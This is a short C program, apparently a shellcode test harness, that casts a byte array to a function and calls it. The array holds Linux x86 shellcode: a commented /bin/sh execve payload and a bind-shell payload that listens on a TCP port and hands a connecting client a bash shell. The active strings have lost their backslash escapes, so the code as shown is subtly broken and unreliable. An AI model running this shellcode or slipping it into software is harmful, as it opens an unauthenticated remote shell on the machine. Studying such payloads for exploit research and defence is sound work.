#include<stdio.h>
#include<string.h>

unsigned char code[] = \
//"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
//"x31xf6x31xdbxb0x66xb3x01x56x6ax01x6ax02x89xe1xcdx80x89xc2x56x66x68x4dx20x6ax02x89xe1x6ax10x51x52x89xe1xcdx80xb0x66xb3x04x6ax01x52x89xe1xcdx80xb0x66xb3x05x56x56x52x89xe1xcdx80x89xc7x31xc9x31xc0xb1x02xb0x3fx89xfbxcdx80x79xf8x31xc0xb0x0bx68x62x61x73x68x68x62x69x63x2fx68x2fx2fx2fx2fx89xe3x89xf1x89xf2xcdx80";
"x31xf6x31xdbx31xc9x31xd2x31xc0x31xffxb0x66xb3x01x56x6ax01x6ax02x89xe1xcdx80x89xc2x56x66x68x05x39x6ax02x89xe1x6ax10x51x52x89xe1xcdx80xb0x66xb3x04x6ax01x52x89xe1xcdx80xb0x66xb3x05x56x56x52x89xe1xcdx80x89xc7x31xc9x31xc0xb1x02xb0x3fx89xfbxcdx80x79xf8x31xc0xb0x0bx68x62x61x73x68x68x62x69x63x2fx68x2fx2fx2fx2fx89xe3x89xf1x89xf2xcdx80";
void main()
{

//  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

